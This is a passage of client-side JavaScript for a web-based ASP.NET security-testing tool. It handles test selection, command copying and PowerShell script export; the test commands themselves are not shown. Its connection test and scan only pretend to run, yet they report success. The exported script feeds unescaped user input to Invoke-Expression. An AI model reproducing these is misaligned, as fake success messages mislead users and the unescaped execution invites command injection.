            testDatabase[categoryName].tests.forEach(test => {
                selectedTests.delete(test.id);
            });
            renderTestCategories();
        }

        // Update statistics
        function updateStats() {
            let critical = 0, high = 0, medium = 0, low = 0;
            
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    switch(test.severity) {
                        case 'critical': critical++; break;
                        case 'high': high++; break;
                        case 'medium': medium++; break;
                        case 'low': low++; break;
                    }
                });
            });
            
            document.getElementById('criticalCount').textContent = critical;
            document.getElementById('highCount').textContent = high;
            document.getElementById('mediumCount').textContent = medium;
            document.getElementById('lowCount').textContent = low;
        }

        function updateFilterCounts() {
            let counts = { all: 0, critical: 0, high: 0, medium: 0, low: 0 };
            
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    counts.all++;
                    counts[test.severity]++;
                });
            });
            
            document.getElementById('allCount').textContent = counts.all;
            document.getElementById('criticalFilterCount').textContent = counts.critical;
            document.getElementById('highFilterCount').textContent = counts.high;
            document.getElementById('mediumFilterCount').textContent = counts.medium;
            document.getElementById('lowFilterCount').textContent = counts.low;
        }

        function updateSelectedCount() {
            document.getElementById('selectedCount').textContent = selectedTests.size;
        }

        // Utility functions
        function highlightCommand(command) {
            return command
                .replace(/(curl|grep|echo|for|do|done|if|then|fi)/g, '<span class="cmd">$1</span>')
                .replace(/(https?:\/\/[^\s"]+)/g, '<span class="url">$1</span>')
                .replace(/(-[a-zA-Z]|\-\-[a-zA-Z-]+)/g, '<span class="param">$1</span>');
        }

        function copyCommand(testId) {
            let test = null;
            Object.values(testDatabase).forEach(category => {
                const found = category.tests.find(t => t.id === testId);
                if (found) test = found;
            });
            
            if (test) {
                const targetUrl = document.getElementById('targetUrl').value;
                const authCookie = document.getElementById('authCookie').value || '';
                
                let command = test.command
                    .replace(/{{URL}}/g, targetUrl)
                    .replace(/{{COOKIE}}/g, authCookie);
                
                navigator.clipboard.writeText(command).then(() => {
                    showNotification('Command copied to clipboard!', 'success');
                });
            }
        }

        function testConnection() {
            const targetUrl = document.getElementById('targetUrl').value;
            if (!targetUrl) {
                showNotification('Please enter a target URL', 'warning');
                return;
            }
            
            showNotification('Testing connection...', 'info');
            setTimeout(() => {
                showNotification('Connection test successful', 'success');
            }, 2000);
        }

        function runScan() {
            if (selectedTests.size === 0) {
                showNotification('Please select at least one test', 'warning');
                return;
            }
            
            const btn = document.getElementById('scanBtn');
            if (isScanning) {
                isScanning = false;
                btn.innerHTML = '<i class="fas fa-play"></i> Start Scan';
                btn.classList.remove('btn-danger');
                btn.classList.add('btn-danger');
                showNotification('Scan stopped', 'info');
                return;
            }
            
            isScanning = true;
            btn.innerHTML = '<i class="fas fa-stop"></i> Stop Scan';
            btn.classList.remove('btn-danger');
            btn.classList.add('btn-danger');
            
            showNotification(`Starting security scan with ${selectedTests.size} tests...`, 'info');
            
            // Simulate scanning
            setTimeout(() => {
                isScanning = false;
                btn.innerHTML = '<i class="fas fa-play"></i> Start Scan';
                btn.classList.remove('btn-danger');
                btn.classList.add('btn-danger');
                showNotification('Security scan completed!', 'success');
            }, 5000);
        }

        function exportScript() {
            if (selectedTests.size === 0) {
                showNotification('Please select at least one test', 'warning');
                return;
            }
            
            generatePowerShellScript();
            document.getElementById('exportModal').classList.remove('hidden');
        }

        function generatePowerShellScript() {
            const targetUrl = document.getElementById('targetUrl').value;
            const framework = document.getElementById('framework').value;
            const authCookie = document.getElementById('authCookie').value;
            
            let script = `# ASP.NET Security Testing Script
# Generated: ${new Date().toISOString()}
# Target: ${targetUrl}
# Framework: ${framework}
# Tests: ${selectedTests.size}

param(
    [string]$Target = "${targetUrl}",
    [string]$Cookie = "${authCookie}",
    [string]$OutputPath = "./security_results.json"
)

$Results = @()
$TestCount = 0

Write-Host "======================================" -ForegroundColor Green
Write-Host "ASP.NET Security Testing Framework" -ForegroundColor Green
Write-Host "======================================" -ForegroundColor Green
Write-Host "Target: $Target" -ForegroundColor White
Write-Host "Tests: ${selectedTests.size}" -ForegroundColor White
Write-Host ""

function Test-Vulnerability {
    param(
        [string]$Name,
        [string]$Severity,
        [string]$Command
    )
    
    $script:TestCount++
    Write-Host "[$script:TestCount/${selectedTests.size}] $Name" -ForegroundColor Yellow
    Write-Host "    Severity: $Severity" -ForegroundColor $(if($Severity -eq "critical"){"Red"}elseif($Severity -eq "high"){"Magenta"}else{"Green"})
    
    try {
        $Result = Invoke-Expression $Command -ErrorAction SilentlyContinue
        Write-Host "    Status: Completed" -ForegroundColor Green
        
        $TestResult = @{
            Name = $Name
            Severity = $Severity
            Command = $Command
            Status = "Completed"
            Timestamp = Get-Date
        }
        $script:Results += $TestResult
        
    } catch {
        Write-Host "    Status: Error - $($_.Exception.Message)" -ForegroundColor Red
    }
    Write-Host ""
}

`;
            
            let testNum = 1;
            selectedTests.forEach(testId => {
                let test = null;
                Object.values(testDatabase).forEach(category => {
                    const found = category.tests.find(t => t.id === testId);
                    if (found) test = found;
                });
                
                if (test) {
                    const command = test.command
                        .replace(/{{URL}}/g, '$Target')
                        .replace(/{{COOKIE}}/g, '$Cookie')
                        .replace(/'/g, "''");
                    
                    script += `# Test ${testNum}: ${test.name}\n`;
                    script += `Test-Vulnerability -Name "${test.name}" -Severity "${test.severity}" -Command "${command}"\n\n`;
                    testNum++;
                }
            });
            
            script += `
Write-Host "======================================" -ForegroundColor Green
Write-Host "Scan Complete!" -ForegroundColor Green
Write-Host "Total Tests: $TestCount" -ForegroundColor White
Write-Host "Results saved to: $OutputPath" -ForegroundColor White

$Results | ConvertTo-Json -Depth 10 | Out-File -FilePath $OutputPath -Encoding UTF8
`;
            
            document.getElementById('scriptOutput').textContent = script;
        }

        function closeModal() {
            document.getElementById('exportModal').classList.add('hidden');
        }

        function copyScript() {
            const script = document.getElementById('scriptOutput').textContent;
            navigator.clipboard.writeText(script).then(() => {
                showNotification('Script copied to clipboard!', 'success');
            });
        }

        function downloadScript() {
            const script = document.getElementById('scriptOutput').textContent;
            const blob = new Blob([script], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'aspnet_security_tests.ps1';
            a.click();
            URL.revokeObjectURL(url);
        }

        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <div class="flex items-center gap-3">
                    <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
                    <span>${message}</span>
                </div>
            `;
            
            document.body.appendChild(notification);
            setTimeout(() => notification.classList.add('show'), 100);
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => document.body.removeChild(notification), 300);
            }, 4000);
        }

        // Initialize application
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
